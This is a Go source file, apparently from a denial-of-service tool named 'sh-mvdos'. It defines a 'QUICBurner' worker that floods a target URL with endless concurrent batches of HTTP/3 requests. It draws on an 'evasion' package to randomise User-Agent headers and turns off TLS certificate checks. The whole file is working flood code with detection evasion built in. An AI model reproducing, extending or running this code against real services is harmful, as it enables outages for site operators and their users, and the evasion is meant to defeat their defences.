package worker

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"sync/atomic"
	"time"

	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
	"github.com/quic-go/quic-go/http3"
)

// QUICBurner stresses HTTP/3 only.
type QUICBurner struct {
	Target    string
	Workers   int
	BatchSize int
}

func (w *QUICBurner) Run(ctx context.Context) (uint64, uint64, error) {
	if w.Workers <= 0 {
		w.Workers = 4
	}
	if w.BatchSize <= 0 {
		w.BatchSize = 50
	}

	client, err := w.newClient()
	if err != nil {
		return 0, 0, err
	}
	var reqs, errs atomic.Uint64
	done := make(chan struct{}, w.Workers)
	for i := 0; i < w.Workers; i++ {
		go func() {
			defer func() { done <- struct{}{} }()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				batch := w.BatchSize
				for j := 0; j < batch; j++ {
					if ctx.Err() != nil {
						return
					}
					req, err := http.NewRequestWithContext(ctx, http.MethodGet, w.Target, nil)
					if err != nil {
						errs.Add(1)
						continue
					}
					req.Header.Set("User-Agent", evasion.RandUA())
					req.Header.Set("Accept", "*/*")
					resp, err := client.Do(req)
					if err != nil {
						errs.Add(1)
						continue
					}
					_, _ = io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					reqs.Add(1)
				}
			}
		}()
	}
	<-ctx.Done()
	for i := 0; i < w.Workers; i++ {
		<-done
	}
	return reqs.Load(), errs.Load(), ctx.Err()
}

func (w *QUICBurner) newClient() (*http.Client, error) {
	roundTripper := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
	}
	client := &http.Client{
		Transport: roundTripper,
		Timeout:   10 * time.Second,
	}
	// Probe once and fail closed if the target does not negotiate HTTP/3.
	req, _ := http.NewRequest(http.MethodHead, w.Target, nil)
	if _, err := client.Do(req); err != nil {
		_ = roundTripper.Close()
		return nil, fmt.Errorf("quicburn: target is not serving HTTP/3: %w", err)
	}
	return client, nil
}
